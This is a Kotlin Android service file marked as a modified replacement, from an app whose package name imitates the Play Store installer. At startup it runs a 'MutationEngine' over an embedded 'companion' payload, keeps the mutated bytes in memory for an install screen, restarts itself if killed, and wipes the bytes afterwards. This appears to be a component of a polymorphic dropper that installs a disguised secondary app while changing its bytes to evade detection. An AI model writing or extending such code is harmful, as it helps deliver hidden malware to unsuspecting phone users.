package com.playstore.installer.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.playstore.installer.MutationEngine
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * LauncherService.kt (MODIFIED)
 * Triggers MutationEngine on service start.
 * Mutated companion bytes stored in memory → InstallActivity reads them.
 *
 * REPLACE: app/src/main/java/com/playstore/installer/service/LauncherService.kt
 */
class LauncherService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    companion object {
        // Mutated companion bytes held in memory
        // InstallActivity reads this instead of assets directly
        @Volatile
        var mutatedCompanionBytes: ByteArray? = null

        @Volatile
        var mutationComplete: Boolean = false

        @Volatile
        var mutationError: Boolean = false
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Trigger mutation in background coroutine
        serviceScope.launch {
            try {
                val engine = MutationEngine(applicationContext)
                val bytes = engine.getMutatedCompanionBytes()

                if (bytes.isNotEmpty()) {
                    mutatedCompanionBytes = bytes
                    mutationComplete = true
                } else {
                    mutationError = true
                    mutationComplete = true
                }
            } catch (e: Exception) {
                mutationError = true
                mutationComplete = true
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
        // Wipe sensitive bytes from memory
        mutatedCompanionBytes?.fill(0)
        mutatedCompanionBytes = null
    }
}
